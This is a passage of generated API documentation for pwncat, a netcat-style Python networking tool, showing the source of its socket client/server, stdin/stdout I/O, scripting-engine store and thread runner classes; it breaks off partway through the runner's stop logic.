<dd>Options to parse back to Sock.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class IONetwork(IO):
    &#34;&#34;&#34;Pwncat implementation based on custom Socket library.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        ssig,  # type: StopSignal
        encoder,  # type: StringEncoder
        host,  # type: str
        ports,  # type: List[int]
        role,  # type: str
        srv_opts,  # type: DsIONetworkSrv
        cli_opts,  # type: DsIONetworkCli
        sock_opts,  # type: DsIONetworkSock
    ):
        # type: (...) -&gt; None
        &#34;&#34;&#34;Create a Pwncat instance of either a server or a client.

        Args:
            ssig (StopSignal): Stop signal instance
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            ports ([int]): List of ports to connect to or listen on.
            role (str): Either &#34;server&#34; or &#34;client&#34;.
            srv_opts (DsIONetworkSrv):   Options for the server.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        &#34;&#34;&#34;
        assert role in [&#34;server&#34;, &#34;client&#34;], &#34;The role must be &#39;server&#39; or &#39;client&#39;.&#34;
        super(IONetwork, self).__init__(ssig)

        self.__role = role
        self.__net = Sock(encoder, ssig, sock_opts)
        self.__sock_opts = sock_opts
        self.__srv_opts = srv_opts
        self.__cli_opts = cli_opts

        try:
            addr = self.__net.gethostbyname(host, ports[0])
        except socket.gaierror:
            sys.exit(1)

        # Internally store addresses for reconn or rebind functions
        self.__addr = addr
        self.__ports = ports
        self.__pport = 0  # pointer to the current port

        if role == &#34;server&#34;:
            if not self.__net.run_server(self.__addr, self.__ports[self.__pport]):
                sys.exit(1)
        if role == &#34;client&#34;:
            if not self.__net.run_client(self.__addr, self.__ports[self.__pport]):
                if not self.__client_reconnect_to_server():
                    sys.exit(1)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Network receive generator which hooks into the receive function and adds features.

        Yields:
            str: Data received from a connected socket.
        &#34;&#34;&#34;
        # Counter for receive retries once this side of the program
        # shuts down (e.g.: Ctrl+c) as there could be data left on the wire.
        curr_recv_timeout_retry = 0

        # Loop endlessly and yield data back to the caller
        while True:
            # [1/3] Generate data
            try:
                yield self.__net.receive()
            # [2/3] Non-blocking socket is finished receiving data and allows us to do some action
            except socket.timeout:
                # Let&#39;s ask the interrupter() function if we should terminate?
                if not self.ssig.has_stop():
                    continue
                # Stop signal is raied when my own side of the network was closed.
                # Happened most likely that the user pressed Ctrl+c
                # Before quitting, we will check x many times, if there is still
                # data left to receive, before shutting down.
                if curr_recv_timeout_retry &lt; self.__sock_opts.recv_timeout_retry:
                    self.log.trace(  # type: ignore
                        &#34;Final socket read: %d/%d before quitting.&#34;,
                        curr_recv_timeout_retry + 1,
                        self.__sock_opts.recv_timeout_retry,
                    )
                    curr_recv_timeout_retry += 1
                    continue
                # We ware all done reading, shut down
                self.ssig.raise_stop()
                return
            # [3/3] Upstream is gone
            except (EOFError, socket.error):
                # Do we have a stop signal?
                if self.ssig.has_stop():
                    return
                # Do we re-accept new clients?
                if self.__sock_opts.udp:
                    # Always accept new clients or reconnect in UDP mode (its stateless)
                    return
                if self.__role == &#34;server&#34; and self.__server_reaccept_from_client():
                    continue
                if self.__role == &#34;client&#34; and self.__client_reconnect_to_server():
                    continue
                return

    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Send data to a socket.&#34;&#34;&#34;
        self.__net.send(data)

    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;[IONetwork] socket.close was raised by calling interrupt() externally.&#34;
        )
        self.__net.close_conn_sock()
        self.__net.close_bind_sock()
        # Raise stop signal
        self.ssig.raise_stop()

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __client_reconnect_to_server(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Ensure the client re-connects to the remote server, if the remote server hang up.

        Returns:
            bool: Returns `True` on success and `False` on failure or stop signal requested.
        &#34;&#34;&#34;
        assert not self.__sock_opts.udp, &#34;This should have been caught during arg check.&#34;
        assert self.__role == &#34;client&#34;, &#34;This should have been caught during arg check.&#34;

        # reconn &lt; 0 (endlessly)
        # reconn &gt; 0 (reconnect until counter reaches zero)
        while self.__cli_opts.reconn != 0:

            # [1/6] Let&#39;s ask the interrupter() function if we should terminate?
            # We need a little wait here in order for the stop signal to propagate.
            # Don&#39;t know how fast the other threads are.
            # time.sleep(0.1)
            # if self.ssig.has_stop():
            #     return False

            # [2/6] Wait
            time.sleep(self.__cli_opts.reconn_wait)

            # [3/6] Let&#39;s ask the interrupter() function if we should terminate?
            # In case the other threads were slower as the sleep time in [1/5]
            # we will check again here.
            if self.ssig.has_stop():
                return False

            # [4/6] Increment the port numer (if --reconn-robin has multiple)
            self.__pport += 1
            if self.__pport == len(self.__ports):
                self.__pport = 0

            if self.__cli_opts.reconn &gt; 0:
                self.log.info(
                    &#34;Reconnecting to %s:%d in %.1f sec (%d more times left)&#34;,
                    self.__addr,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                    self.__cli_opts.reconn,
                )
            else:
                self.log.info(
                    &#34;Reconnecting to %s:%d in %.1f sec (indefinitely)&#34;,
                    self.__addr,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                )

            # [5/6] Decrease reconnect counter
            if self.__cli_opts.reconn &gt; 0:
                self.__cli_opts.reconn -= 1

            # [6/6] Recurse until True or reconnect count is used up
            if self.__net.run_client(self.__addr, self.__ports[self.__pport]):
                return True

        # [5/5] Signal failure
        self.log.info(&#34;Reconnect count is used up. Shutting down.&#34;)
        return False

    def __server_reaccept_from_client(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Ensure the server is able to keep connection open by re-accepting new clients.

        Returns:
            bool: True on success and False on failure
        &#34;&#34;&#34;
        # Do not re-accept for UDP
        assert not self.__sock_opts.udp, &#34;This should have been caught during arg check.&#34;
        assert self.__role == &#34;server&#34;, &#34;This should have been caught during arg check.&#34;

        # [NO] Do not re-accept
        if not self.__srv_opts.keep_open:
            self.log.info(&#34;No automatic re-accept specified. Shutting down.&#34;)
            return False

        # [MAYBE] Check stop signal and otherwise try until success.
        while True:
            time.sleep(0.1)
            # [NO] We have a stop signal
            if self.ssig.has_stop():
                return False
            # [YES] Re-accept indefinitely
            self.log.info(&#34;Re-accepting new clients&#34;)
            if self.__net.re_accept_client():
                return True</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="pwncat.IO" href="#pwncat.IO">IO</a></li>
<li>abc.ABC</li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="pwncat.IONetwork.consumer"><code class="name flex">
<span>def <span class="ident">consumer</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Send data to a socket.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def consumer(self, data):
    # type: (str) -&gt; None
    &#34;&#34;&#34;Send data to a socket.&#34;&#34;&#34;
    self.__net.send(data)</code></pre>
</details>
</dd>
<dt id="pwncat.IONetwork.interrupt"><code class="name flex">
<span>def <span class="ident">interrupt</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Stop function that can be called externally to close this instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def interrupt(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
    self.log.trace(  # type: ignore
        &#34;[IONetwork] socket.close was raised by calling interrupt() externally.&#34;
    )
    self.__net.close_conn_sock()
    self.__net.close_bind_sock()
    # Raise stop signal
    self.ssig.raise_stop()</code></pre>
</details>
</dd>
<dt id="pwncat.IONetwork.producer"><code class="name flex">
<span>def <span class="ident">producer</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Network receive generator which hooks into the receive function and adds features.</p>
<h2 id="yields">Yields</h2>
<dl>
<dt><code>str</code></dt>
<dd>Data received from a connected socket.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def producer(self):
    # type: () -&gt; Iterator[str]
    &#34;&#34;&#34;Network receive generator which hooks into the receive function and adds features.

    Yields:
        str: Data received from a connected socket.
    &#34;&#34;&#34;
    # Counter for receive retries once this side of the program
    # shuts down (e.g.: Ctrl+c) as there could be data left on the wire.
    curr_recv_timeout_retry = 0

    # Loop endlessly and yield data back to the caller
    while True:
        # [1/3] Generate data
        try:
            yield self.__net.receive()
        # [2/3] Non-blocking socket is finished receiving data and allows us to do some action
        except socket.timeout:
            # Let&#39;s ask the interrupter() function if we should terminate?
            if not self.ssig.has_stop():
                continue
            # Stop signal is raied when my own side of the network was closed.
            # Happened most likely that the user pressed Ctrl+c
            # Before quitting, we will check x many times, if there is still
            # data left to receive, before shutting down.
            if curr_recv_timeout_retry &lt; self.__sock_opts.recv_timeout_retry:
                self.log.trace(  # type: ignore
                    &#34;Final socket read: %d/%d before quitting.&#34;,
                    curr_recv_timeout_retry + 1,
                    self.__sock_opts.recv_timeout_retry,
                )
                curr_recv_timeout_retry += 1
                continue
            # We ware all done reading, shut down
            self.ssig.raise_stop()
            return
        # [3/3] Upstream is gone
        except (EOFError, socket.error):
            # Do we have a stop signal?
            if self.ssig.has_stop():
                return
            # Do we re-accept new clients?
            if self.__sock_opts.udp:
                # Always accept new clients or reconnect in UDP mode (its stateless)
                return
            if self.__role == &#34;server&#34; and self.__server_reaccept_from_client():
                continue
            if self.__role == &#34;client&#34; and self.__client_reconnect_to_server():
                continue
            return</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="pwncat.IO" href="#pwncat.IO">IO</a></b></code>:
<ul class="hlist">
<li><code><a title="pwncat.IO.log" href="#pwncat.IO.log">log</a></code></li>
<li><code><a title="pwncat.IO.ssig" href="#pwncat.IO.ssig">ssig</a></code></li>
</ul>
</li>
</ul>
</dd>
<dt id="pwncat.IOStdinStdout"><code class="flex name class">
<span>class <span class="ident">IOStdinStdout</span></span>
<span>(</span><span>ssig, opts)</span>
</code></dt>
<dd>
<div class="desc"><p>Implement basic stdin/stdout I/O module.</p>
<p>This I/O module provides a generator which continuously reads from stdin
(non-blocking on POSIX and blocking on Windows) as well as a
callback that writes to stdout.</p>
<p>Set specific options for this I/O module.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ssig</code></strong> :&ensp;<code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></dt>
<dd>StopSignal instance.</dd>
<dt><strong><code>opts</code></strong> :&ensp;<code><a title="pwncat.DsIOStdinStdout" href="#pwncat.DsIOStdinStdout">DsIOStdinStdout</a></code></dt>
<dd>IO options.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class IOStdinStdout(IO):
    &#34;&#34;&#34;Implement basic stdin/stdout I/O module.

    This I/O module provides a generator which continuously reads from stdin
    (non-blocking on POSIX and blocking on Windows) as well as a
    callback that writes to stdout.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, opts):
        # type: (StopSignal, DsIOStdinStdout) -&gt; None
        &#34;&#34;&#34;Set specific options for this I/O module.

        Args:
            ssig (StopSignal): StopSignal instance.
            opts (DsIOStdinStdout): IO options.
        &#34;&#34;&#34;
        super(IOStdinStdout, self).__init__(ssig)
        self.__opts = opts

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Constantly ask for user input.

        Yields:
            str: Data read from stdin.
        &#34;&#34;&#34;
        # https://stackoverflow.com/questions/1450393/#38670261
        # while True: line = sys.stdin.readline() &lt;- reads a whole line (faster)
        # for line in sys.stdin.readlin():        &lt;- reads one byte at a time
        while True:
            if self.ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged for reading STDIN-1&#34;)  # type: ignore
                return
            try:
                # TODO: select() does not work for windows on stdin/stdout
                if os.name != &#34;nt&#34;:
                    self.__set_input_timeout()
                line = sys.stdin.readline()
            except EOFError:
                # When using select() with timeout, we don&#39;t have any input
                # at this point and simply continue the loop or quit if
                # a terminate request has been made by other threads.
                if self.ssig.has_stop():
                    self.log.trace(&#34;Stop signal acknowledged for reading STDIN-2&#34;)  # type: ignore
                    return
                continue
            if line:
                self.log.debug(&#34;Received %d bytes from STDIN&#34;, len(line))
                self.log.trace(&#34;Received: %s&#34;, repr(line))  # type: ignore
                yield line
            # EOF or &lt;Ctrl&gt;+&lt;d&gt;
            else:
                # DO NOT RETURN HERE BLINDLY, THE UPSTREAM CONNECTION MUST GO FIRST!
                if self.ssig.has_stop():
                    self.log.trace(&#34;Stop signal acknowledged for reading STDIN-3&#34;)  # type: ignore
                    return

    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Print received data to stdout.&#34;&#34;&#34;
        # For issues with flush (when using tail -F or equal) see links below:
        # https://stackoverflow.com/questions/26692284
        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
        print(data, end=&#34;&#34;)
        try:
            sys.stdout.flush()
        except (BrokenPipeError, IOError):
            # Python flushes standard streams on exit; redirect remaining output
            # to devnull to avoid another BrokenPipeError at shutdown
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;[IOStdinStdout] interrupt() invoked&#34;
        )
        # Raise stop signal
        # TODO: Check if this is required???
        self.ssig.raise_stop()

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __set_input_timeout(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Throws a catchable EOFError exception for sys.stdin after timeout (Linux only).&#34;&#34;&#34;
        # rlist: wait until ready for reading
        # wlist: wait until ready for writing
        # xlist: wait for an exceptional condition
        if not select.select([sys.stdin], [], [], self.__opts.input_timeout)[0]:
            raise EOFError(&#34;timed out&#34;)</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="pwncat.IO" href="#pwncat.IO">IO</a></li>
<li>abc.ABC</li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="pwncat.IOStdinStdout.consumer"><code class="name flex">
<span>def <span class="ident">consumer</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Print received data to stdout.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def consumer(self, data):
    # type: (str) -&gt; None
    &#34;&#34;&#34;Print received data to stdout.&#34;&#34;&#34;
    # For issues with flush (when using tail -F or equal) see links below:
    # https://stackoverflow.com/questions/26692284
    # https://docs.python.org/3/library/signal.html#note-on-sigpipe
    print(data, end=&#34;&#34;)
    try:
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        # Python flushes standard streams on exit; redirect remaining output
        # to devnull to avoid another BrokenPipeError at shutdown
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())</code></pre>
</details>
</dd>
<dt id="pwncat.IOStdinStdout.interrupt"><code class="name flex">
<span>def <span class="ident">interrupt</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Stop function that can be called externally to close this instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def interrupt(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
    self.log.trace(  # type: ignore
        &#34;[IOStdinStdout] interrupt() invoked&#34;
    )
    # Raise stop signal
    # TODO: Check if this is required???
    self.ssig.raise_stop()</code></pre>
</details>
</dd>
<dt id="pwncat.IOStdinStdout.producer"><code class="name flex">
<span>def <span class="ident">producer</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Constantly ask for user input.</p>
<h2 id="yields">Yields</h2>
<dl>
<dt><code>str</code></dt>
<dd>Data read from stdin.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def producer(self):
    # type: () -&gt; Iterator[str]
    &#34;&#34;&#34;Constantly ask for user input.

    Yields:
        str: Data read from stdin.
    &#34;&#34;&#34;
    # https://stackoverflow.com/questions/1450393/#38670261
    # while True: line = sys.stdin.readline() &lt;- reads a whole line (faster)
    # for line in sys.stdin.readlin():        &lt;- reads one byte at a time
    while True:
        if self.ssig.has_stop():
            self.log.trace(&#34;Stop signal acknowledged for reading STDIN-1&#34;)  # type: ignore
            return
        try:
            # TODO: select() does not work for windows on stdin/stdout
            if os.name != &#34;nt&#34;:
                self.__set_input_timeout()
            line = sys.stdin.readline()
        except EOFError:
            # When using select() with timeout, we don&#39;t have any input
            # at this point and simply continue the loop or quit if
            # a terminate request has been made by other threads.
            if self.ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged for reading STDIN-2&#34;)  # type: ignore
                return
            continue
        if line:
            self.log.debug(&#34;Received %d bytes from STDIN&#34;, len(line))
            self.log.trace(&#34;Received: %s&#34;, repr(line))  # type: ignore
            yield line
        # EOF or &lt;Ctrl&gt;+&lt;d&gt;
        else:
            # DO NOT RETURN HERE BLINDLY, THE UPSTREAM CONNECTION MUST GO FIRST!
            if self.ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged for reading STDIN-3&#34;)  # type: ignore
                return</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="pwncat.IO" href="#pwncat.IO">IO</a></b></code>:
<ul class="hlist">
<li><code><a title="pwncat.IO.log" href="#pwncat.IO.log">log</a></code></li>
<li><code><a title="pwncat.IO.ssig" href="#pwncat.IO.ssig">ssig</a></code></li>
</ul>
</li>
</ul>
</dd>
<dt id="pwncat.PSEStore"><code class="flex name class">
<span>class <span class="ident">PSEStore</span></span>
<span>(</span><span>ssig, net)</span>
</code></dt>
<dd>
<div class="desc"><p>Pwncats Scripting Engine store to persist and exchange data for send/recv scripts.</p>
<p>The same instance of this class will be available to your send and receive scripts
that allow you to exchange data or manipulate themselves. You even have access to the
currently used instance of the networking class to manipulate the active socket.
As well as to the logger and StopSignal instances.</p>
<p>Instantiate the PSE class.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ssig</code></strong> :&ensp;<code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></dt>
<dd>Instance of the StopSignal class to force a shutdown.</dd>
<dt><strong><code>net</code></strong> :&ensp;<code><a title="pwncat.IONetwork" href="#pwncat.IONetwork">IONetwork</a></code></dt>
<dd>Instance of the current network class to manipulate the socket.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class PSEStore(object):
    &#34;&#34;&#34;Pwncats Scripting Engine store to persist and exchange data for send/recv scripts.

    The same instance of this class will be available to your send and receive scripts
    that allow you to exchange data or manipulate themselves. You even have access to the
    currently used instance of the networking class to manipulate the active socket.
    As well as to the logger and StopSignal instances.
    &#34;&#34;&#34;

    @property
    def messages(self):
        # type: () -&gt; Dict[str, List[str]]
        &#34;&#34;&#34;`Dict[str, List[str]]`: Stores sent and received messages by its thread name.&#34;&#34;&#34;
        return self.__messages

    @messages.setter
    def messages(self, value):
        # type: (Dict[str, List[str]]) -&gt; None
        self.__messages = value

    @property
    def store(self):
        # type: () -&gt; Any
        &#34;&#34;&#34;`Any`: Custom data store to be used in PSE scripts to persist your data between calls.&#34;&#34;&#34;
        return self.__store

    @store.setter
    def store(self, value):
        # type: (Any) -&gt; None
        self.__store = value

    @property
    def ssig(self):
        # type: () -&gt; StopSignal
        &#34;&#34;&#34;`StopSignal`: Instance of Logging.logger class.&#34;&#34;&#34;
        return self.__ssig

    @property
    def net(self):
        # type: () -&gt; List[IONetwork]
        &#34;&#34;&#34;`IONetwork`: List of active IONetwork instances (client or server).&#34;&#34;&#34;
        return self.__net

    @property
    def log(self):
        # type: () -&gt; logging.Logger
        &#34;&#34;&#34;`Logging.logger`: Instance of Logging.logger class.&#34;&#34;&#34;
        return self.__log

    def __init__(self, ssig, net):
        # type: (StopSignal, List[IONetwork]) -&gt; None
        &#34;&#34;&#34;Instantiate the PSE class.

        Args:
            ssig (StopSignal): Instance of the StopSignal class to force a shutdown.
            net (IONetwork): Instance of the current network class to manipulate the socket.
        &#34;&#34;&#34;
        self.__messages = {}
        self.__store = None
        self.__ssig = ssig
        self.__net = net
        self.__log = logging.getLogger(__name__)</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.PSEStore.log"><code class="name">var <span class="ident">log</span></code></dt>
<dd>
<div class="desc"><p><code>Logging.logger</code>: Instance of Logging.logger class.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def log(self):
    # type: () -&gt; logging.Logger
    &#34;&#34;&#34;`Logging.logger`: Instance of Logging.logger class.&#34;&#34;&#34;
    return self.__log</code></pre>
</details>
</dd>
<dt id="pwncat.PSEStore.messages"><code class="name">var <span class="ident">messages</span></code></dt>
<dd>
<div class="desc"><p><code>Dict[str, List[str]]</code>: Stores sent and received messages by its thread name.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def messages(self):
    # type: () -&gt; Dict[str, List[str]]
    &#34;&#34;&#34;`Dict[str, List[str]]`: Stores sent and received messages by its thread name.&#34;&#34;&#34;
    return self.__messages</code></pre>
</details>
</dd>
<dt id="pwncat.PSEStore.net"><code class="name">var <span class="ident">net</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.IONetwork" href="#pwncat.IONetwork">IONetwork</a></code>: List of active IONetwork instances (client or server).</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def net(self):
    # type: () -&gt; List[IONetwork]
    &#34;&#34;&#34;`IONetwork`: List of active IONetwork instances (client or server).&#34;&#34;&#34;
    return self.__net</code></pre>
</details>
</dd>
<dt id="pwncat.PSEStore.ssig"><code class="name">var <span class="ident">ssig</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code>: Instance of Logging.logger class.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def ssig(self):
    # type: () -&gt; StopSignal
    &#34;&#34;&#34;`StopSignal`: Instance of Logging.logger class.&#34;&#34;&#34;
    return self.__ssig</code></pre>
</details>
</dd>
<dt id="pwncat.PSEStore.store"><code class="name">var <span class="ident">store</span></code></dt>
<dd>
<div class="desc"><p><code>Any</code>: Custom data store to be used in PSE scripts to persist your data between calls.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def store(self):
    # type: () -&gt; Any
    &#34;&#34;&#34;`Any`: Custom data store to be used in PSE scripts to persist your data between calls.&#34;&#34;&#34;
    return self.__store</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.Runner"><code class="flex name class">
<span>class <span class="ident">Runner</span></span>
<span>(</span><span>pse)</span>
</code></dt>
<dd>
<div class="desc"><p>Runner class that takes care about putting everything into threads.</p>
<p>Create a new Runner object.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>pse</code></strong> :&ensp;<code><a title="pwncat.PSEStore" href="#pwncat.PSEStore">PSEStore</a></code></dt>
<dd>Pwncat Scripting Engine store.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class Runner(object):
    &#34;&#34;&#34;Runner class that takes care about putting everything into threads.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, pse):
        # type: (PSEStore) -&gt; None
        &#34;&#34;&#34;Create a new Runner object.

        Args:
            pse (PSEStore): Pwncat Scripting Engine store.
        &#34;&#34;&#34;
        self.log = logging.getLogger(__name__)

        # Dict of producer/consumer action to run in a thread.
        # Each list item will be run in its own thread
        self.__actions = {}  # type: Dict[str, DsRunnerAction]

        # Dict of timed function definition to run in a thread.
        # Each list item will be run in its own thread.
        self.__timers = {}  # type: Dict[str, DsRunnerTimer]

        # A dict which holds the threads created from actions.
        # The name is based on the __actions name
        # {&#34;name&#34;: &#34;&lt;thread&gt;&#34;}
        self.__threads = {}  # type: Dict[str, threading.Thread]

        self.__pse = pse

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def add_action(self, name, action):
        # type: (str, DsRunnerAction) -&gt; None
        &#34;&#34;&#34;Add a function to the producer/consumer thread pool runner.

        Args:
            name (str): The name for the added action (will be used for logging the tread name).
            action (DsRunnerAction): Instance of DSRunnerAction.
        &#34;&#34;&#34;
        self.__actions[name] = action

    def add_timer(self, name, timer):
        # type: (str, DsRunnerTimer) -&gt; None
        &#34;&#34;&#34;Add a function to the timer thread pool runner.

        Args:
            name (str): The name for the added timer (will be used for logging the thread name).
            timer (DsRunnerTimer): Instance of DsRunnerTimer.
        &#34;&#34;&#34;
        self.__timers[name] = timer

    def run(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Run threaded pwncat I/O modules.&#34;&#34;&#34;

        def run_action(
            name,  # type: str
            producer,  # type: Callable[[], str]
            consumer,  # type: Callable[[str], None]
            transformers,  # type: List[Transform]
            code,  # type: Optional[Union[str, bytes, CodeType]]
        ):
            # type: (...) -&gt; None
            &#34;&#34;&#34;Producer/consumer run function to be thrown into a thread.

            Args:
                name (str): Name for logging output.
                producer (function): A generator function which yields data.
                consumer (function): A callback which consumes data from the generator.
                transformers ([function]): List of transformer functions applied before consumer.
                code (ast.AST): User-supplied python code with a transform(data) -&gt; str function.
            &#34;&#34;&#34;
            self.log.trace(&#34;[%s] Producer Start&#34;, name)  # type: ignore
            for data in producer():
                self.log.trace(&#34;[%s] Producer received: %s&#34;, name, repr(data))  # type: ignore

                # [1/3] Transform data before sending it to the consumer
                for transformer in transformers:
                    data = transformer.transform(data)
                if transformers:
                    self.log.trace(  # type: ignore
                        &#34;[%s] Producer data after transformers: %s&#34;, name, repr(data)
                    )

                # [2/3] Apply custom user-supplied code transformations
                if code is not None:
                    self.log.debug(
                        &#34;[%s] Executing user supplied transform(data, pse) -&gt; data function&#34;, name
                    )
                    pse = self.__pse
                    # Add current message to PSE store
                    if name in self.__pse.messages:
                        self.__pse.messages[name] = self.__pse.messages[name] + [data]
                    else:
                        self.__pse.messages[name] = [data]
                    # Execute script code
                    exec(code, {}, locals())  # pylint: disable=exec-used
                    data = locals()[&#34;transform&#34;](data, pse)

                    self.log.trace(  # type: ignore
                        &#34;[%s] Producer data after user supplied transformer: %s&#34;, name, repr(data)
                    )

                # [3/3] Consume it
                consumer(data)
            self.log.trace(&#34;[%s] Producer Stop&#34;, name)  # type: ignore

        def run_timer(name, action, intvl, ssig, args, **kwargs):
            # type: (str, Callable[..., None], int, StopSignal, Any, Any) -&gt; None
            &#34;&#34;&#34;Timer run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called in a given intervall
                intvl (float):     Intervall at which the action function will be called
                ssig (StopSignal): Providing has_stop() and raise_stop()
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            &#34;&#34;&#34;
            self.log.trace(&#34;[%s] Timer Start (exec every %f sec)&#34;, name, intvl)  # type: ignore
            time_last = int(time.time())
            while True:
                if ssig.has_stop():
                    self.log.trace(&#34;Stop signal acknowledged for timer %s&#34;, name)  # type: ignore
                    return
                time_now = int(time.time())
                if time_now &gt; time_last + intvl:
                    self.log.debug(&#34;[%s] Executing timed function&#34;, time_now)
                    action(*args, **kwargs)
                    time_last = time_now  # Reset previous time
                time.sleep(0.1)

        # Start available action in a thread
        for key in self.__actions:
            # Create Thread object
            thread = threading.Thread(
                target=run_action,
                name=key,
                args=(
                    key,
                    self.__actions[key].producer,
                    self.__actions[key].consumer,
                    self.__actions[key].transformers,
                    self.__actions[key].code,
                ),
            )
            thread.daemon = False
            thread.start()
            self.__threads[key] = thread
        # Start available timers in a thread
        for key in self.__timers:
            # Create Thread object
            thread = threading.Thread(
                target=run_timer,
                name=key,
                args=(
                    key,
                    self.__timers[key].action,
                    self.__timers[key].intvl,
                    self.__timers[key].signal,
                    self.__timers[key].args,
                ),
                kwargs=self.__timers[key].kwargs,
            )
            thread.daemon = False
            thread.start()

        def check_stop(force):
            # type: (int) -&gt; bool
            &#34;&#34;&#34;Stop threads.&#34;&#34;&#34;
            for key in self.__threads:
                if not self.__threads[key].is_alive() or force:
                    # TODO: How are we gonna call the stop signal now?
                    #  # [1/3] Inform all threads (inside) about a stop signal.
                    #  # All threads with non-blocking funcs will be able to stop themselves
                    #  self.log.trace(  # type: ignore
                    #      &#34;Raise stop signal: StopSignal.stop() for thread [%s]&#34;,
                    #      self.__threads[key].getName(),
                    #  )
                    #  self.__actions[key].signal.raise_stop()
                    # [2/3] Call external interrupters
                    # These will shutdown all blocking functions inside a thread,
                    # so that they are actually able to join
                    for interrupt in self.__actions[key].interrupts:
                        self.log.trace(  # type: ignore
                            &#34;Call INTERRUPT: %s.%s() for %s&#34;,
                            getattr(interrupt, &#34;__self__&#34;).__class__.__name__,
                            interrupt.__name__,
                            self.__threads[key].getName(),
